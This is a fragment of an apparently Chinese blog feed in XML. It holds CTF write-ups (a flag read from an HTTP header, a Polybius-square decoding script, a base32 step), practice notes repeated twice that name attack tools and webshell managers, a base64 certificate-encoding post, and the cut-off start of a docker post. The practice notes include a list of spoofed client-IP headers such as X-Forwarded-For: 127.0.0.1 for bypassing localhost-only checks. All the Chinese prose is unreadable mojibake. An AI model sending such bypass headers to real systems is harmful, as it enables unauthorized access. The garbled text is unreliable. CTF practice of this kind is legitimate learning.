title="base32"></a>base32</h2><p>å°†é¢˜ç›®ä¸­çš„å†…å®¹è¿›è¡Œbase32è§£ç ï¼Œå³å¯è·å¾—flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2022å®‰å…¨æ¯”èµ›ä¸ªäººèµ›è§£é¢˜æ€è·¯</title>
    <link href="/2023/07/27/ctf/unsupported/2022%E5%AE%89%E5%85%A8%E6%AF%94%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9B%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/"/>
    <url>/2023/07/27/ctf/unsupported/2022%E5%AE%89%E5%85%A8%E6%AF%94%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9B%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="heade3"><a href="#heade3" class="headerlink" title="heade3"></a>heade3</h2><p>Burpsuiteæ‹¦æˆª è®¿é—®    å‘ç°äº†flagå­—æ®µ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Thu, 27 Jul 2023 06:03:34 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=UTF-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>3042<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/8.0.15<br><span class="hljs-attribute">Flag</span><span class="hljs-punctuation">: </span>flag&#123;9964ea2e-b321-4629-a613-780ff5441ee0&#125;<br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br></code></pre></td></tr></table></figure><h2 id="Polybius"><a href="#Polybius" class="headerlink" title="Polybius"></a>Polybius</h2><p>å°†é¢˜ç›®ä¸­çš„å‹ç¼©åŒ…è§£å‹åï¼Œçœ‹åˆ°æç¤ºå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">æ£‹ç›˜:[[<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>], [<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>], [<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>], [<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>], [<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>]]<br>å¯†æ–‡:13,43,42,22,33,35,21,54,21,21,21,21,21,21<br></code></pre></td></tr></table></figure><p>æ ¹æ®è¯¥æ ¼å¼ï¼Œä½¿ç”¨pythonè„šæœ¬æ¥è·å–è¾“å‡ºä¸ºï¼šæ˜æ–‡ï¼š THISFLAGAAAAAAï¼Œä½¿ç”¨flagåŒ…è£¹ï¼Œå³ä¸ºflag{THISFLAGAAAAAA}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_polybius_square</span>(<span class="hljs-params">board</span>):<br>    <span class="hljs-comment"># åˆ›å»ºPolybiusæ£‹ç›˜ï¼Œä½¿ç”¨ç»™å®šçš„2å…ƒæ•°ç»„è¡¨ç¤º</span><br>    polybius_square = &#123;&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(board)):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(board[i])):<br>            polybius_square[board[i][j]] = (i + <span class="hljs-number">1</span>, j + <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> polybius_square<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_polybius</span>(<span class="hljs-params">polybius_square, ciphertext</span>):<br>    <span class="hljs-comment"># è§£å¯†Polybiuså¯†æ–‡</span><br>    plaintext = <span class="hljs-string">&quot;&quot;</span><br>    ciphertext = ciphertext.replace(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)  <span class="hljs-comment"># å»é™¤é€—å·åˆ†éš”</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(ciphertext), <span class="hljs-number">2</span>):<br>        row = <span class="hljs-built_in">int</span>(ciphertext[i])<br>        col = <span class="hljs-built_in">int</span>(ciphertext[i + <span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">for</span> letter, position <span class="hljs-keyword">in</span> polybius_square.items():<br>            <span class="hljs-keyword">if</span> position == (row, col):<br>                plaintext += letter<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> plaintext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># ç»™å‡ºPolybiusæ£‹ç›˜ï¼Œä»¥2å…ƒæ•°ç»„è¡¨ç¤º</span><br>    chessboard = [[<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>], [<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>], [<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>], [<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>], [<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>]]<br>    <br>    <span class="hljs-comment"># ç»™å‡ºå¯†æ–‡ï¼Œæ¯ä¸¤ä¸ªå­—ç¬¦ç”¨é€—å·åˆ†éš”</span><br>    ciphertext = <span class="hljs-string">&quot;13,43,42,22,33,35,21,54,21,21,21,21,21,21&quot;</span><br><br>    <span class="hljs-comment"># åˆ›å»ºPolybiusæ£‹ç›˜</span><br>    polybius_square = create_polybius_square(chessboard)<br><br>    <span class="hljs-comment"># è§£å¯†å¹¶æ‰“å°æ˜æ–‡</span><br>    plaintext = decrypt_polybius(polybius_square, ciphertext)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ˜æ–‡ï¼š&quot;</span>, plaintext)<br></code></pre></td></tr></table></figure><h2 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h2><p>å°†é¢˜ç›®ä¸­çš„å†…å®¹è¿›è¡Œbase32è§£ç ï¼Œå³å¯è·å¾—flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfç³»åˆ—ã€‘ç»ƒä¹ é¢˜</title>
    <link href="/2023/07/24/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
    <url>/2023/07/24/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91%E7%BB%83%E4%B9%A0%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p> <a href="http://www.bihuoedu.com/">ç½‘ç»œå®‰å…¨CTFæ¯”èµ›æ¨¡æ‹Ÿé¢˜</a></p><p>webï¼šç½‘ç»œæ”»é˜²<br>reverseï¼šé€†å‘å·¥ç¨‹<br>pwnï¼šäºŒè¿›åˆ¶<br>cryptoï¼šå¯†ç å­¦<br>mobileï¼šç§»åŠ¨å®‰å…¨<br>miscï¼šå®‰å…¨æ‚é¡¹</p><h2 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><h3 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h3><p>æµè§ˆå™¨æ’ä»¶<br>å³é”® æ£€æŸ¥</p><h2 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h2><p>javaç¼–å†™çš„ç”¨äºæµ‹è¯•ç½‘ç»œåº”ç”¨ç¨‹åºå®‰å…¨æ€§çš„å›¾å½¢åŒ–å·¥å…·</p><p>dvwaé¶åœº</p><p>æœ¬åœ°è®¿é—®<br>X-Forwarded-For:127.0.0.1</p><p>ä¸­æ–‡ä¹±ç ï¼š<a href="https://blog.csdn.net/weixin_46329243/article/details/112950158">https://blog.csdn.net/weixin_46329243/article/details/112950158</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">Client-IP: 127.0.0.1<br>Forwarded-For-Ip: 127.0.0.1<br>Forwarded-For: 127.0.0.1<br>Forwarded-For: localhost<br>Forwarded: 127.0.0.1<br>Forwarded: localhost<br>True-Client-IP: 127.0.0.1<br>X-Client-IP: 127.0.0.1<br>X-Custom-IP-Authorization: 127.0.0.1<br>X-Forward-For: 127.0.0.1<br>X-Forward: 127.0.0.1<br>X-Forward: localhost<br>X-Forwarded-By: 127.0.0.1<br>X-Forwarded-By: localhost<br>X-Forwarded-For-Original: 127.0.0.1<br>X-Forwarded-For-original: localhost<br>X-Forwarded-For: 127.0.0.1<br>X-Forwarded-For: localhost<br>X-Forwarded-Server: 127.0.0.1<br>X-Forwarded-Server: localhost<br>X-Forwarded: 127.0.0.1<br>X-Forwarded: localhost<br>X-Forwared-Host: 127.0.0.1<br>X-Forwared-Host: localhost<br>X-Host: 127.0.0.1<br>X-Host: localhost<br>X-HTTP-Host-Override: 127.0.0.1<br>X-Originating-IP: 127.0.0.1<br>X-Real-IP: 127.0.0.1<br>X-Remote-Addr: 127.0.0.1<br>X-Remote-Addr: localhost<br>X-Remote-IP: 127.0.0.1<br></code></pre></td></tr></table></figure><h2 id="webshellç®¡ç†å·¥å…·"><a href="#webshellç®¡ç†å·¥å…·" class="headerlink" title="webshellç®¡ç†å·¥å…·"></a>webshellç®¡ç†å·¥å…·</h2><p>ä¸€å¥è¯æœ¨é©¬</p><p>èšå‰‘ã€å†°èã€å“¥æ–¯æ‹‰<br>æµè§ˆå™¨ï¼šabout:config</p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>sqlæ³¨å…¥<br>ç”¨äºæ¢æµ‹ç›®æ ‡æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥</p><h2 id="hackbar-1"><a href="#hackbar-1" class="headerlink" title="hackbar"></a>hackbar</h2><p>åŒå†™ç»•è¿‡</p><p>view-source:<a href="http://a.y1ng.vip:1126/robots/robots.txt">http://a.y1ng.vip:1126/robots/robots.txt</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfç³»åˆ—ã€‘ç»ƒä¹ é¢˜</title>
    <link href="/2023/07/24/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
    <url>/2023/07/24/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91%E7%BB%83%E4%B9%A0%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p> <a href="http://www.bihuoedu.com/">ç½‘ç»œå®‰å…¨CTFæ¯”èµ›æ¨¡æ‹Ÿé¢˜</a></p><p>webï¼šç½‘ç»œæ”»é˜²<br>reverseï¼šé€†å‘å·¥ç¨‹<br>pwnï¼šäºŒè¿›åˆ¶<br>cryptoï¼šå¯†ç å­¦<br>mobileï¼šç§»åŠ¨å®‰å…¨<br>miscï¼šå®‰å…¨æ‚é¡¹</p><h2 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><h3 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h3><p>æµè§ˆå™¨æ’ä»¶<br>å³é”® æ£€æŸ¥</p><h2 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h2><p>javaç¼–å†™çš„ç”¨äºæµ‹è¯•ç½‘ç»œåº”ç”¨ç¨‹åºå®‰å…¨æ€§çš„å›¾å½¢åŒ–å·¥å…·</p><p>dvwaé¶åœº</p><p>æœ¬åœ°è®¿é—®<br>X-Forwarded-For:127.0.0.1</p><p>ä¸­æ–‡ä¹±ç ï¼š<a href="https://blog.csdn.net/weixin_46329243/article/details/112950158">https://blog.csdn.net/weixin_46329243/article/details/112950158</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">Client-IP: 127.0.0.1<br>Forwarded-For-Ip: 127.0.0.1<br>Forwarded-For: 127.0.0.1<br>Forwarded-For: localhost<br>Forwarded: 127.0.0.1<br>Forwarded: localhost<br>True-Client-IP: 127.0.0.1<br>X-Client-IP: 127.0.0.1<br>X-Custom-IP-Authorization: 127.0.0.1<br>X-Forward-For: 127.0.0.1<br>X-Forward: 127.0.0.1<br>X-Forward: localhost<br>X-Forwarded-By: 127.0.0.1<br>X-Forwarded-By: localhost<br>X-Forwarded-For-Original: 127.0.0.1<br>X-Forwarded-For-original: localhost<br>X-Forwarded-For: 127.0.0.1<br>X-Forwarded-For: localhost<br>X-Forwarded-Server: 127.0.0.1<br>X-Forwarded-Server: localhost<br>X-Forwarded: 127.0.0.1<br>X-Forwarded: localhost<br>X-Forwared-Host: 127.0.0.1<br>X-Forwared-Host: localhost<br>X-Host: 127.0.0.1<br>X-Host: localhost<br>X-HTTP-Host-Override: 127.0.0.1<br>X-Originating-IP: 127.0.0.1<br>X-Real-IP: 127.0.0.1<br>X-Remote-Addr: 127.0.0.1<br>X-Remote-Addr: localhost<br>X-Remote-IP: 127.0.0.1<br></code></pre></td></tr></table></figure><h2 id="webshellç®¡ç†å·¥å…·"><a href="#webshellç®¡ç†å·¥å…·" class="headerlink" title="webshellç®¡ç†å·¥å…·"></a>webshellç®¡ç†å·¥å…·</h2><p>ä¸€å¥è¯æœ¨é©¬</p><p>èšå‰‘ã€å†°èã€å“¥æ–¯æ‹‰<br>æµè§ˆå™¨ï¼šabout:config</p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>sqlæ³¨å…¥<br>ç”¨äºæ¢æµ‹ç›®æ ‡æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥</p><h2 id="hackbar-1"><a href="#hackbar-1" class="headerlink" title="hackbar"></a>hackbar</h2><p>åŒå†™ç»•è¿‡</p><p>view-source:<a href="http://a.y1ng.vip:1126/robots/robots.txt">http://a.y1ng.vip:1126/robots/robots.txt</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€linuxç³»åˆ—ã€‘(202307) å¸¸ç”¨å‘½ä»¤ï¼šè¯ä¹¦ç›¸å…³</title>
    <link href="/2023/07/17/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202307)%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9A%E8%AF%81%E4%B9%A6%E7%9B%B8%E5%85%B3/"/>
    <url>/2023/07/17/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202307)%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9A%E8%AF%81%E4%B9%A6%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">base64</span>å‚æ•°ï¼š<br>       -w, --wrap=COLS<br>              wrap encoded lines after COLS character (default 76).  Use 0 to <span class="hljs-built_in">disable</span> line wrapping<br><br><br><span class="hljs-built_in">cat</span> ca.pem | <span class="hljs-built_in">base64</span> -w 0<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cat ca.pem | base64 </span><br>LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURlakNDQW1LZ0F3SUJBZ0lVYnFnYm5MVnVi<br>NHNwTjJqS0xOY245d1QrVlhRd0RRWUpLb1pJaHZjTkFRRUwKQlFBd1F6RUxNQWtHQTFVRUJoTUNR<br>MDR4RURBT0JnTlZCQWdUQjBKbGFXcHBibWN4RURBT0JnTlZCQWNUQjBKbAphV3BwYm1jeEVEQU9C<br>Z05WQkFNVEIyVjBZMlFnUTBFd0hoY05NakF4TWpNd01EYzBPVEF3V2hjTk1qVXhNakk1Ck1EYzBP<br>VEF3V2pCRE1Rc3dDUVlEVlFRR0V3SkRUakVRTUE0R0ExVUVDQk1IUW1WcGFtbHVaekVRTUE0R0Ex<br>VUUKQnhNSFFtVnBhbWx1WnpFUU1BNEdBMVVFQXhNSFpYUmpaQ0JEUVRDQ0FTSXdEUVlKS29aSWh2<br>Y05BUUVCQlFBRApnZ0VQQURDQ0FRb0NnZ0VCQUo1YzZKMWpMb3d6L1E4Z2VsNGp1dDZ2TzRzOE1B<br>bnZnVmlJbE5YQXlHb1JvN1IvCm44c3hhWU4vdHM1eUhYN0NVNDlaaFVPeGQ0MU1BdUJmdVVGZCtr<br>VVI4a0o1b3RScEFlN1FTUXFKNEt4MnZqY0cKdXF0RldGTGMyUTFQUjM3NTFjQVBqYmVGd1gwbTFx<br>OFhYUHdqaWczVWVRaTFhdjM3VmVOVzhpS3FzOVpBUThtVwpWUTQyY2VFd0s4TzZSenFINllNRlI2<br>QkVlRS8yMnpsaE1OcmRsc1E5QjdQQkdzM2pXbEhsalowTHlyeU1NQTl5CldpMFJCelhoWVhMcDcy<br>VktsaU5LSzJLdWFVZ1FPdVpHUEY3YUVJYmR5bzBlY3RYMUo2YzBVZ1pxSVlTMkhzRUgKSTAweHZV<br>RS9lVHhsdXk4dy9IT3Vsc01KcVBsNVNXWXhPd3lFM1kwQ0F3RUFBYU5tTUdRd0RnWURWUjBQQVFI<br>LwpCQVFEQWdFR01CSUdBMVVkRXdFQi93UUlNQVlCQWY4Q0FRSXdIUVlEVlIwT0JCWUVGTW1Gei9j<br>b2VzSWdsbTZHCkd2SUdvejBnU0NPUU1COEdBMVVkSXdRWU1CYUFGTW1Gei9jb2VzSWdsbTZHR3ZJ<br>R296MGdTQ09RTUEwR0NTcUcKU0liM0RRRUJDd1VBQTRJQkFRQVlBMEh1K0MyRWN1WXFxcDdQZGt2<br>MHc4SklGMTRTQWJVVVFVcHFtZVhuUmZIVgpOOVZhM3pUMUEyalE1clNadXBCTDMzUzZTVStheU9w<br>dkxNKzIzMzR3SkdFNXRaVE9ZZ2E3OXZ5R3VoL1cxcTFsCksvUkhGQi9SZllLUitOT2pGRGk4bzdH<br>d3RrTzFqZWVnZnJxWEFXNzdhRVAxTmRsNlBVbTk1YStQc1VVVGdzaXQKN2ZNbjBPRmdXQ09xNkRH<br>dWNQM1RIYWx6N3RGVytPUjVjWloxWExqa1JWRFNFR0ZSVnJTV1MrZzVjaG1ma3V6bwo0R0pDNCti<br>eGRnanpuQWlhdlVsQkNnSWMwU2pabVFUeHFGcUhkbVprbVJjVkQwekJpVlFmd0Z6TSs3RUZycUJ1<br>CjJiOVVxdkJQZkk4cTA0Y3FTYmh4elFqcTE1T1lOdklJMDNnMVl6RmEKLS0tLS1FTkQgQ0VSVElG<br>SUNBVEUtLS0tLQo=<br><br><br><span class="hljs-comment"># cat ca.pem | base64 -w 0</span><br>LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURlakNDQW1LZ0F3SUJBZ0lVYnFnYm5MVnViNHNwTjJqS0xOY245d1QrVlhRd0RRWUpLb1pJaHZjTkFRRUwKQlFBd1F6RUxNQWtHQTFVRUJoTUNRMDR4RURBT0JnTlZCQWdUQjBKbGFXcHBibWN4RURBT0JnTlZCQWNUQjBKbAphV3BwYm1jeEVEQU9CZ05WQkFNVEIyVjBZMlFnUTBFd0hoY05NakF4TWpNd01EYzBPVEF3V2hjTk1qVXhNakk1Ck1EYzBPVEF3V2pCRE1Rc3dDUVlEVlFRR0V3SkRUakVRTUE0R0ExVUVDQk1IUW1WcGFtbHVaekVRTUE0R0ExVUUKQnhNSFFtVnBhbWx1WnpFUU1BNEdBMVVFQXhNSFpYUmpaQ0JEUVRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRApnZ0VQQURDQ0FRb0NnZ0VCQUo1YzZKMWpMb3d6L1E4Z2VsNGp1dDZ2TzRzOE1BbnZnVmlJbE5YQXlHb1JvN1IvCm44c3hhWU4vdHM1eUhYN0NVNDlaaFVPeGQ0MU1BdUJmdVVGZCtrVVI4a0o1b3RScEFlN1FTUXFKNEt4MnZqY0cKdXF0RldGTGMyUTFQUjM3NTFjQVBqYmVGd1gwbTFxOFhYUHdqaWczVWVRaTFhdjM3VmVOVzhpS3FzOVpBUThtVwpWUTQyY2VFd0s4TzZSenFINllNRlI2QkVlRS8yMnpsaE1OcmRsc1E5QjdQQkdzM2pXbEhsalowTHlyeU1NQTl5CldpMFJCelhoWVhMcDcyVktsaU5LSzJLdWFVZ1FPdVpHUEY3YUVJYmR5bzBlY3RYMUo2YzBVZ1pxSVlTMkhzRUgKSTAweHZVRS9lVHhsdXk4dy9IT3Vsc01KcVBsNVNXWXhPd3lFM1kwQ0F3RUFBYU5tTUdRd0RnWURWUjBQQVFILwpCQVFEQWdFR01CSUdBMVVkRXdFQi93UUlNQVlCQWY4Q0FRSXdIUVlEVlIwT0JCWUVGTW1Gei9jb2VzSWdsbTZHCkd2SUdvejBnU0NPUU1COEdBMVVkSXdRWU1CYUFGTW1Gei9jb2VzSWdsbTZHR3ZJR296MGdTQ09RTUEwR0NTcUcKU0liM0RRRUJDd1VBQTRJQkFRQVlBMEh1K0MyRWN1WXFxcDdQZGt2MHc4SklGMTRTQWJVVVFVcHFtZVhuUmZIVgpOOVZhM3pUMUEyalE1clNadXBCTDMzUzZTVStheU9wdkxNKzIzMzR3SkdFNXRaVE9ZZ2E3OXZ5R3VoL1cxcTFsCksvUkhGQi9SZllLUitOT2pGRGk4bzdHd3RrTzFqZWVnZnJxWEFXNzdhRVAxTmRsNlBVbTk1YStQc1VVVGdzaXQKN2ZNbjBPRmdXQ09xNkRHdWNQM1RIYWx6N3RGVytPUjVjWloxWExqa1JWRFNFR0ZSVnJTV1MrZzVjaG1ma3V6bwo0R0pDNCtieGRnanpuQWlhdlVsQkNnSWMwU2pabVFUeHFGcUhkbVprbVJjVkQwekJpVlFmd0Z6TSs3RUZycUJ1CjJiOVVxdkJQZkk4cTA0Y3FTYmh4elFqcTE1T1lOdklJMDNnMVl6RmEKLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo=<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€dockerç³»åˆ—ã€‘(202307) æ„å»ºdashboardçš„armé•œåƒ</title>
    <link href="/2023/07/13/docker/%E3%80%90docker%E7%B3%BB%E5%88%97%E3%80%91(202307)%20%E6%9E%84%E5%BB%BAdashboard%E7%9A%84arm%E9%95%9C%E5%83%8F/"/>
    <url>/2023/07/13/docker/%E3%80%90docker%E7%B3%BB%E5%88%97%E3%80%91(202307)%20%E6%9E%84%E5%BB%BAdashboard%E7%9A%84arm%E9%95%9C%E5%83%8F/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 